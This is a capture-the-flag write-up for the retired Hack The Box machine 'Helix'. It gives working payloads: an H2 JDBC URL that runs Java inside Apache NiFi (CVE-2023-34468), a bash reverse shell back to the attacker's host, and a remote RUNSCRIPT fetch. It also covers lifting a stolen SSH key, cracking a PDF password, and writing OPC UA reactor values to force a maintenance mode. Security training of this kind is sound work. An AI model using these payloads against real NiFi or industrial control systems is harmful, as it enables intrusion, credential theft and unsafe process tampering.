---
machine: Helix
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, apache-nifi, h2, ics, cve-2023-34468, opc-ua]
---

# Helix — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

An industrial workflow simulated on **Apache NiFi 1.21.0** (`flow.helix.htb:8080/nifi`). The canvas is served **without authentication** and the anonymous user holds `canWrite: true`. The CVE is documented as requiring authentication, but with the canvas open that requirement is void: the anonymous user can create the controller service and the processor himself. The `ExecuteSQL` processor accepts a `DBCPConnectionPool` with whatever JDBC URL you supply: point it at your own **H2** database with `CREATE ALIAS` and Java runs inside NiFi's JVM (**CVE-2023-34468**), yielding a shell as `nifi`. After that, an SSH key backup in the service's support files gets you in as `operator`, and escalation arrives through the internal OPC UA service plus the maintenance console.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.helix.htb" -w subdomains.txt -mc 200
```

```text
22/tcp    ssh
80/tcp    nginx
8080/tcp  Apache NiFi 1.21.0 (vhost flow.helix.htb)
```

```bash
echo "<IP> helix.htb flow.helix.htb" | sudo tee -a /etc/hosts
```

`/nifi-api/flow/about` confirms `"version":"1.21.0"`, the last release before the patch. The canvas loads with no login: there are no credentials to break.

## Foothold: H2 inside NiFi

1. Create a `DBCPConnectionPool` **Controller Service**:

```text
Database Connection URL: jdbc:h2:mem:pwn;INIT=CREATE ALIAS PWN AS $$void pwn(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); }$$
Database Driver Class:   org.h2.Driver
```

2. Add an `ExecuteSQL` processor bound to that service and run:

```sql
CALL PWN('bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"')
```

3. Start the processor and push a flowfile.

```bash
nc -lvnp 4444
```

```text
nifi@helix:/opt/nifi-1.21.0$
```

When the INIT does not fit in the URL: `jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://<IP>/init.sql'`, with the `CREATE ALIAS` and the `CALL` in the script.

## Pivot to operator

```bash
ls /opt/nifi-1.21.0/support_bundles/
# operator_id_ed25519.bak
cat /opt/nifi-1.21.0/support_bundles/operator_id_ed25519.bak > /tmp/op.key
chmod 600 /tmp/op.key
ssh -i /tmp/op.key operator@<IP>
```

The support bundle stores `operator`'s ed25519 key in clear text. Their home holds a password-protected `maintenance.pdf` (`pdf2john` + rockyou) and a PNG with the control diagram: the PDF describes the maintenance window, and its password is **the same one the OPC UA server accepts**.

## Escalation

```bash
ss -ltnp
# 127.0.0.1:4840  OPC UA  (opc.tcp://127.0.0.1:4840/helix/)
# 127.0.0.1:8081  reactor HMI
sudo -l
# (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Tunnel 4840 (`ssh -L 4840:127.0.0.1:4840 operator@<IP>`) and write reactor nodes: `MODE=MAINTENANCE` and `CalibrationOffset=11.0`, which pushes the temperature to **295 °C**. The safety controller — not the operator's mode switch — then grants the window by writing `maintenance_window`; only with that file present does the console start:

```bash
sudo /usr/local/sbin/helix-maint-console
```

The window the agent grants is what unlocks the console; forcing maintenance mode from the HMI alone is not enough. Inside it, commands as root.

## Evidence (redacted)

```text
/home/operator/user.txt  -> <user_flag>
/root/root.txt           -> <root_flag>
```

## Lessons

- Any processor accepting a **JDBC URL** is a Java RCE primitive when the H2 driver is on the classpath.
- `INIT=`, `RUNSCRIPT FROM` and `CREATE ALIAS` are H2's classic triad, recycled from Spring Boot to NiFi.
- A service's configuration backups routinely carry keys and secrets in clear text.
- Mitigation: JDBC drivers on an allowlist, no `INIT` in URLs, NiFi kept off the user network, and `sudo` limited to specific audited actions.
